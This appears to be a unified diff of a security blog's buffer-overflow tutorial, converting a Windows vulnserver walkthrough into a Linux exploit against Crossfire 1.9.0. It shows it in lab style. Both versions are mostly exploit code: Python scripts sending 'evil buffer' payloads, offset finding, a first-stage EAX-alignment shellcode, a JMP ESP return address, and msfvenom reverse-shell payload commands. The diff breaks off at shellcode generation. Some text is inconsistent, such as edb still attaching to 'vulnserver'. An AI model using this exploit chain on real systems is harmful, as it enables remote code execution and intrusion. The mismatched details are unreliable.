@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en-us">
   <head>
-    <title>Notes - Windows Buffer Overflows // FMisi&#39;s security.log</title>
+    <title>Notes - Linux Buffer Overflows // FMisi&#39;s security.log</title>
     <link rel="shortcut icon" href="../favicon.ico" />
     <meta charset="utf-8" />
     <meta name="generator" content="Hugo 0.105.0">
@@ -11,9 +11,9 @@
     <link rel="stylesheet" href="../../stiluslapom.css" />
 
     <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Notes - Windows Buffer Overflows"/>
+<meta name="twitter:title" content="Notes - Linux Buffer Overflows"/>
 <meta name="twitter:description" content=""/>
-    <meta property="og:title" content="Notes - Windows Buffer Overflows" />
+    <meta property="og:title" content="Notes - Linux Buffer Overflows" />
 	<meta name="og:description" content=""/>
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://fmisi.github.io/notes/4-maintain-access/index.html" /><meta property="article:section" content="notes" />
@@ -47,7 +47,7 @@
   <article class="post">
     <header class="post-header">
       <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="fmisi" data-description="Support me on Buy me a coffee!" data-message="" data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
-      <h1 class ="post-title">Notes - Windows Buffer Overflows</h1>
+      <h1 class ="post-title">Notes - Linux Buffer Overflows</h1>
       <div class="post-meta">
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
@@ -102,127 +102,122 @@ Controlling the EIP register by being able the write to it can lead to buffer ov
 8. Root!</br>
 <h3>1. Spiking</h3>
 In this entry, the environment where we test looks like the following.</br>
-We have an attacker machine running Kali Linux (the tools to be utilized are found on Parrot OS too) and a machine running the most recent version of Windows with 32 bit architecture.</br>
-The Kali Linux has an IP address of 192.168.20.131 and the Windows machine has an IP address of 192.168.1.90, both machines are on the 192.168.0.0/16 subnet, and can communicate with each other.</br>
-For the purpose of this entry, the Windows machine runs vulnserver, a server that we can use to learn about buffer overflows.</br>
-The Windows machine also has Immunity Debugger downloaded.</br>
-Fortunately, Windows Defender and other antivirus solutions picks vulnserver.exe up and they block it.</br>
-Let's assume that Windows Defender and other antivirus solutions are turned off on the Windows machine.</br>
-First things first, we start the vulnserver.exe application with administrative privileges.</br>
-We do the same with Immunity Debugger.</br>
-In Immunity Debugger, we click File --> Attach and search for the vulnserver process.</br>
+We have an attacker machine running Kali Linux (the tools to be utilized are found on Parrot OS too) and a machine running the most recent version of Debian Linux with 64 bit architecture.</br>
+The Kali Linux has an IP address of 10.11.0.6 and the Debian machine has an IP address of 10.11.0.128, both machines are on the 10.11.0.0/24 subnet, and can communicate with each other.</br>
+For the purpose of this entry, the Debian machine runs Crossfire, a linux based role playing game.</br>
+Specifically, Crossfire 1.9.0 is vulnerable to a network based buffer overflow when passing a string of more than 4000 bytes to the setup sound command.</br>
+The Debian machine also has edb downloaded.</br>
+Unfortunately, antivirus solutions do not pick up crossfire at the time of this writing.</br>
+Let's assume that antivirus solutions are turned off on the Debian machine.</br>
+The Crossfire application has been compiled without any memory protection mechanism.</br>
+First things first, we start the Crossfire application with administrative privileges.</br>
+We do the same with edb.</br>
+In edb, we click File --> Attach and search for the vulnserver process.</br>
 We click on the vulnserver process and click on the Attach button.</br>
-If something has been attached to Immunity Debugger, it gets paused.</br>
+If something has been attached to edb, it gets paused.</br>
 The run it, we do not need to search for the Run button.</br>
 It could be more convenient to press F9 and it will resume the application from the Paused state.</br></br>
-The vulnserver application listens on port 9999 by default.</br>
-Let's set up a netcat listener so we can examine how this application works.</br>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># nc -nv 192.168.1.90 9999</span>
-</span></span><span style="display:flex;"><span>Welcome</span>
-</span></span><span style="display:flex;"><span>HELP</span>
-</span></span><span style="display:flex;"><span>Valid Commands:</span>
-</span></span><span style="display:flex;"><span>STATS [...]</span>
-</span></span><span style="display:flex;"><span>[...]</span>
-</span></span><span style="display:flex;"><span>TRUN [...]</span>
-</span></span><span style="display:flex;"><span>[...]</span>
-</span></span><span style="display:flex;"><span>EXIT</span>
-</span></span><span style="display:flex;"><span>EXIT</span>
-</span></span><span style="display:flex;"><span>GOODBYE</span>
-</code></div>
-Interesting. The application accepts input after most of the valid commands.</br>
-We will take a look at the STATS and the TRUN commands only, but in a real test, we would look at all of the commands.</br>
-It is advisable to write spike scripts for them.</br>
-Let's do this now!</br>
-stats.spk:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-spike" data-lang="spike"><span style="display:flex;"><span><span>s_readline();</span>
-</span></span><span style="display:flex;"><span>s_string("STATS ");</span>
-</span></span><span style="display:flex;"><span>s_string(" ");</span>
-</code></div>
-trun.spk:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-spike" data-lang="spike"><span style="display:flex;"><span><span>s_readline();</span>
-</span></span><span style="display:flex;"><span>s_string("TRUN ");</span>
-</span></span><span style="display:flex;"><span>s_string(" ");</span>
-</code></div>
-Let's try to send a bunch of A characters to the specified input fields with generic_send_tcp and the spike scripts.</br>
-<b>Make sure Immunity Debugger is showing the Running state and the application is not crashed before executing the commands!</br>
-The application and Immunity Debugger must be restarted every time and the application must be reattached every time and the application must be "Running" (not "Paused") before making a step AND after putting one or more files to one of Immunity Debugger's folder to ensure this!</b>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># generic_send_tcp 192.168.1.90 9999 stats.spk 0 0</span>
-</code></div>
-With the stats.spk script, we did not achive a crash whatsoever.</br>
-Maybe we will have more luck with another spike script.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span># generic_send_tcp 192.168.1.90 9999 trun.spk 0 0</span>
-</code></div>
-Excellent!</br>The Immunity Debugger shows that the application has been Paused and down left we can see there is an Access violation message.</br>
-On the Registers view we can see that the EIP register's value has been overwritten to 41414141.</br>
-41 stands for A in hex code so the EIP has been overwritten with four A characters.</br>
-We see a bunch of A characters as the EAX register's value and we see a /.:/ sign before the A characters.</br>
-This will be importtant in the Fuzzing part.</br>
-First step is done.</br>
+The Crossfire application listens on port 13327 by default.</br></br>
+We skip the spiking step because we already know that the Crossfire application's vulnerable input field is the field after the setup sound command.
 <h3>2. Fuzzing</h3>
 We can crash the application and we know what input field we can utilize to achive the crash of the application.</br>
 Let's determine the place in memory where the crash happens.</br>
 We can do it easily with a script.</br>
+We can copy and modify a script from the public exploit instead of writing the exploit from scratch.</br>
 Let's make and execute the script now!</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 1.py</span>
 </code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br>from time import sleep</br></br>buffer = "A" * 100</br></br>while True:</br>    try:</br>        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</br>        s.connect(('192.168.1.90', 9999))</br>        s.send(('TRUN /.:/' + buffer, 9999))</br>        s.close()</br>        sleep(1)</br>        buffer = buffer + "A" * 100</br>    except:</br>        print("Fuzzing crashed at %s bytes" % str(len()))</br>        sys.exit()</span>
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>buffer = "A" * 100</br></br>crash = "\x41" * 4379</br></br>buffer = "\x11(setup sound " + crash + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span>
 </code></div>
-Remember the /.:/ part as the EAX register's value? We put it after the TRUN command so the application understands the remaining input.</br>
-Let's execute the script, wait for a little and cancel the execution if it doesn't stop without cancelling!
+Let's execute the script.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># chmod +x 1.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># ./1.py</br>^CFuzzing crashed at 2700 bytes</span></code></div>
-It looks like the fuzzing crashed at 2700 bytes. Unfortunately, it doesn't necessarily mean that the offset is at 2700 bytes.</br>
+<span><span># ./1.py</span></code></div>
+It looks like the fuzzing crashed.
 Let's find the offset now!
 <h3>3. Finding the Offset</h3>
-ceil(2700) = ? = 3000.
+ceil(4000) = ? = 5000, but the public exploit utilizes the 4379 multiplier with a bunch of A characters, so we can work with that.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000</br>Aa0[...]</br>*copy*</span></code></div>
+<span><span># /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4379</br>Aa0[...]</br>*copy*</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br></br>offset = "Aa0[...]"</br></br>try:</br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>    s.connect(('192.168.1.90', 9999))</br>    s.send(('TRUN /.:/' + offset))</br>    s.close()</br></br>except:</br>    print("Error connecting to server")</br>    sys.exit()</br></span></code></div>
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>pattern = "Aa0[...]"</br></br>buffer = "\x11(setup sound " + pattern + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># chmod +x 2.py</span></code></div>
+<span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># ./2.py</span></code></div>
-After executing this script, we can see in Immunity Debugger that the EIP register's value changed to 386F4337.</br>
+After executing this script, we can see in edb that the EIP register's value changed to 46367046.</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337</br>[*] Exact match at offset 2003</span></code></div>
-Solution for step number three: the offset is at the 2003rd byte.
+<span><span># /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046</br>[*] Exact match at offset 4368</span></code></div>
+Solution for step number three: the offset is at the 4368th byte.
 <h3>4. Overwriting the EIP</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br></br>shellcode = "A" * 2003 + "B" * 4</br></br>try:</br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>    s.connect(('192.168.1.90', 9999))</br>    s.send(('TRUN /.:/' + shellcode))</br>    s.close()</br></br>except:</br>    print("Error connecting to server")</br>    sys.exit()</br></span></code></div>
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>crash = "\x41" * 4368 + "B" * 4 + "C" * 7</br></br>buffer = "\x11(setup sound " + crash + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
 We don't need to issue the chmod command if we just modify a script that is already executable but I will issue the chmod command anyway.
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># chmod +x 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># ./2.py</span></code></div>
-In Immunity Debugger, we can see that - for example - the EBP register's value changed to 41414141 but the EIP register's value is not 41414141 now but 42424242.</br>
+In edb, we can see that - for example - the EBP register's value changed to 41414141 but the EIP register's value is not 41414141 now but 42424242.</br>
 42 is hex code for B.</br>
+We can also see that there is space for the C characters too.</br>
 We have just successfully overwritten the EIP register!
 <h3>5. Finding Bad Characters</h3>
 When we generate/write shellcode, we must know what characters are good for the shellcode and what characters are not good for the shellcode.</br>
 To find bad characters, we can run all the hex characters through the application and see if any of then act up.</br>
 By default, the null byte (/x00) character acts up, so we don't worry about it and remember that the /x00 is a bad character.</br>
+Before we can find more bad characters, it is advisable to find space for our shellcode.</br>
+<h3>5.1. Locating Space For Our Shellcode</h3>
+The EAX register seems to point to the beginning of our buffer, including the "setup sound" string.</br>
+The fact that EAX points directly to the beginning of the command string may impact our ability to simply jump to the buffer pointed at by EAX as we would be executing the hex opcode's equivalent of the ASCII string "setup sound" before our shellcode.</br>This would most likely mangle the execution path and cause our exploit to fail...</br></br>...or, would it?</br></br>
+Further examination of the actual opcode (copy the EAX register's value, press Ctrl+G and paste the value in 0x01234567 format) generated by the setup sound string reveals some interesting instructions.</br></br>
+<img src="yesice.png" alt="The opcode instructions translate to conditional jumps"></br></br>
+The opcode instructions translate to conditional jumps.</br>
+All this jumps seem to be leading into our controlled buffer, so a jump to EAX may actually work for us in this case...</br>
+...however, this is NOT an elegant solution, so let's try harder!</br>
+Continuing our analysis, it looks like the ESP register points towards the end of our unique buffer at the time of the crash but it only gives a few bytes of shellcode to work with.</br>
+Right click on the ESP register's value and click "Follow in Dump".</br></br>
+<img src="yesice2.png" alt="The opcode instructions translate to conditional jumps"></br></br>
+We can try to insert a first stage shellcode into that limited space.</br>
+Rather than an actual payload such as a reverse shell, this first stage payload will be used to align the EAX register in order to make it point to our buffer right after the setup sound string and then jump to that location, allowing us to skip the conditional jumps.</br>
+In order to achieve this, our first stage shellcode would need to increase the value of EAX by twelve bytes as there are twelve characters in the string "setup sound".</br>
+We can accomplish this with an ADD assembly instruction and then using a JMP assembly instruction to jump to the memory pointed by EAX.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
+<span><span># locate nasm_shell</br>[...]</br>/usr/[...]/nasm_shell.rb</span></code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
+<span><span># /usr/[...]/nasm_shell.rb</span>
+<span><span>nasm> ADD EAX,12</br>00000000    83C00C    add eax,byte +0xc</br>nasm> JMP EAX</br>00000000    FFE0      jmp eax</span></code></div>
+The ADD EAX,12 assembly instruction's opcode equivalent is 83C00C.</br>
+The JMP EAX assembly instruction's opcode equivalent is FFE0.</br>
+Fortunately for us, this two sets of instructions take up only five bytes of memory.</br>
+We can update our script to include this first stage payload and two "\x90" knobs in order to maintain the correct length.</br>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;">
+<span><span>nasm> exit</span></code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
+<span><span># gedit 2.py</span></code></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"</br></br>crash = "\x41" * 4368 + "\x42" * 4 + first_stage</br></br>buffer = "\x11(setup sound " + crash + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
+<h3>5.2. Actually Finding Bad Characters</h3>
 Let's go to <a href="https://github.com/cytopia/badchars">https://github.com/cytopia/badchars</a> page and copy the badchars = ( "\x01\[...]") stuff under Python.</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br></br>badchars = ("\x01\[...]"</br>)</br></br>shellcode = "A" * 2003 + "B" * 4 + badchars</br></br>try:</br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>    s.connect(('192.168.1.90', 9999))</br>    s.send(('TRUN /.:/' + shellcode))</br>    s.close()</br></br>except:</br>    print("Error connecting to server")</br>    sys.exit()</br></span></code></div>
-Do not put \x00 as the part of the badchars int the script as it can cause problems.</br>
+<span><span>#!/usr/bin/python</br>import socket</br></br>badchars = ("\x01\[...]"</br>)</br></br>host = "10.11.0.128"</br></br>crash = "\x41" * 4368 + "B" * 4 + badchars</br></br>buffer = "\x11(setup sound " + crash + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># chmod +x 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># ./2.py</span></code></div>
 It is the ESP register's value that we have to follow in dump to find bad characters.</br>
-In Immunity Debugger, right click on the ESP register's value and select "Follow in Dump".</br>
-We cannot see any anomaly in the Hex dump view, which means the \x00 character is the only bad character.</br>
+In edb, right click on the ESP register's value and select "Follow in Dump".</br>
+In case we can only examine the shellcode's space, after executing (and modifing appropriately) the script multiple times can we see an anomaly in the Hex dump view, which means the \x00 character is not the only one bad character.</br>
+We can see that the \x20 is a bad character too.</br>
+We do not see any anomaly after that.</br>
 We have successfully found all bad characters.</br>
 Let's see an example of another application's hex dump.</br></br>
 <img src="image.png" height="65%" width="65%" alt="hex dump of another app"></br></br>
@@ -231,69 +226,52 @@ Furthermore, if we see B0 characters next to each other, only the first one from
 On the picture, the places where the bad characters can be found are marked with a red quadrilateral.
 <h3>6. Finding the Right Module</h3>
 A right module is a DLL or something similar that does not have memory protection (such as DEP, ASLR, SSDH, etc.).</br>
-Download mona.py to the Windows machine from here: <a href="https://github.com/corelan/mona">https://github.com/corelan/mona</a>.</br>
-Put in mona.py here: C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</br>
-Let's use the mona script in Immunity Debugger.</br>
-Write the following and press Enter in the bottom line.</br></br>
-!mona modules</br></br>
-Among other things, we see the following:</br></br>
-False | False | False | False | False | [...]\essfunc.dll</br></br>
-The essfunc.dll does not have any memory protections so it will be a right module for our purposes.</br>
-We need the opcode equivalent to the JMP ESP assembly instruction to make the application's execution jump to a place where it waits for other commands, leading to Remote Code Execution (RCE).</br>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># locate nasm_shell</br>[...]</br>/usr/[...]/nasm_shell.rb</span></code></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># /usr/[...]/nasm_shell.rb</span></code></div>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;">
-<span><span>nasm> JMP ESP</br>00000000    FFE4    jmp esp</span></code></div>
-The JMP ESP assembly instruction's opcode equivalent is FFE4.
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;">
-<span><span>nasm> exit</span></code></div>
-In Immunity Debugger, we issue the following command in the bottom barand press Enter:</br></br>
-!mona find -s "\xff\xe4" -m essfunc.dll</br></br>
-Among other things, we see the following:</br></br>
-[*] Results:
-0x625011af
-[...]
-0x62501205</br></br>
-We need the very first address, which is 0x625011af.</br>
-The 32 bit architecture for an operating system is little endian ==> we have to provide the result for the shellcode not just in hex format, but in reverse order!</br>
-Let's do this now!</br>
+Do you remember that the application was compiled without memory protections?</br>
+The right module in this case will be the application itself as it was compiled without any memory protections.</br>
+Before generating the shellcode, it is advisable to achieve an overflow, where the program "fills up", waiting for further instructions.</br>
+Let's do try to achieve this now!</br>
+We can do this by finding a return address by finding a valid assembly intruction to redirect code execution to the memory location pointed to by the ESP register.</br>
+In edb, click Plugins --> OpcodeSearcher --> Opcode Search.</br>
+Using this plugin, we can easily search for a JMP ESP assembly instruction or equivalent in the memory region where the code section of the Crossfire application is mapped.</br></br>
+<img src="yesice3.png" height="65%" width="65%" alt="search for a JMP ESP assembly instruction or equivalent in the memory region"></br></br>
+We choose to proceed with the first JMP ESP assembly instruction found by the debugger.</br>
+We copy this instruction's address value, but we only need it's 0x12345678 format.</br>
+We are getting closer so let's restart everything before we continue.</br>
+Before we modify our script, let's set a breakpoint on the JMP ESP return address.</br>
+We can do this with the edb BreakpointManager plugin.</br>
+In edb, click Plugins --> BreakpointManager --> Breakpoints.</br>
+We click on the Add Breakpoint button and paste the address value on the popup window's input field.</br>
+This address will be 0x08134596.</br>
+We click on the OK button, then on the Close button.</br>
+Then we let the application run and return to Kali.</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
-<span><span>#!/usr/bin/python</br>import sys, socket</br></br>shellcode = "A" * 2003 + "\xaf\x11\x50\x62"</br></br>try:</br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>    s.connect(('192.168.1.90', 9999))</br>    s.send(('TRUN /.:/' + shellcode))</br>    s.close()</br></br>except:</br>    print("Error connecting to server")</br>    sys.exit()</br></span></code></div>
-Let's minimize and maximize the Immunity Debugger in a way that we can see the default views.</br>
-In Immunity Debugger, we have to click on the bluish black button on the upper bar, also known as the "Enter expression to follow" button.</br>
-We have to enter the first address as expression without the 0x part.</br>
-Enter 625011af and press OK.</br>
-After that, we should find FFE4 JMP ESP.</br>
-We have to set a breakpoint here. Press F2 to do this.</br>
-By doing this, we achieve an overflow, the program "fills up", waiting for further instructions.
-Let's execute our script and see what's up (of course, make sure now too that the application is running and is not in "Paused" state).</br>
+<span><span>#!/usr/bin/python</br>import socket</br></br>host = "10.11.0.128"</br></br>padding = "\x41" * 4368</br></br>eip = "\x96\x45\x13\x08" # because of little endianness, we write this value in reverse order</br></br>first_stage = "\x83\xc0\x0c\xff\xe0\x90"</br></br>buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"</br></br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</br>print("[*]Sending evil buffer...")</br></br>s.connect((host, 13327))</br>print(s.recv(1024))</br></br>s.send(buffer)</br>s.close()</br></br>print("[*]Payload Sent !")</br></span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># chmod +x 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># ./2.py</span></code></div>
-In Immunity Debugger on the bottom part we see that "Breakpoint at essfunc.625011af".</br>
-625011af is exactly the EIP register's value now which means the essfunc.dll is indeed a right module.
+If we done everything right, the debugger stopped at the JMP ESP instruction, and the appliation wait's for further commands.</br>
+Restart and re-attach.</br>
 <h3>7. Generating Shellcode</h3>
 The shellcode must contain a non-staged payload as we are goind to utilize it while listening with netcat.</br>
 The netcat tool can only listen to non-staged payloads, it is essentially deef when it comes to staged payloads as it can only hear the stages separate to each other.</br>
 Let's generate a non-staged payload with msfvenom.</br>
-Note that by setting the EXITFUNC to thread, the exploit will be more stable.</br>
+Note that we do not need to set the EXITFUNC to thread in this case, but it doesn't hurt to try.</br>
 The -f is the file type switch, the -a is the architecture switch, the -b is the bad characters switch.</br>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
-<span><span># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.20.131 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"</br>[...]</br>Payload size: 351 bytes</br>[...]</br>"\xbe[...]</br>\x58"  *copy without the semicolon*</br>;</span></code></div>
+<span><span># msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode</br>[...]</br>Payload size: 95 bytes</br>[...]</br>"shellcode = ""[...]</br>\x36"  *copy*</br></span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;">
 <span><span># gedit 2.py</span></code></div>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;">
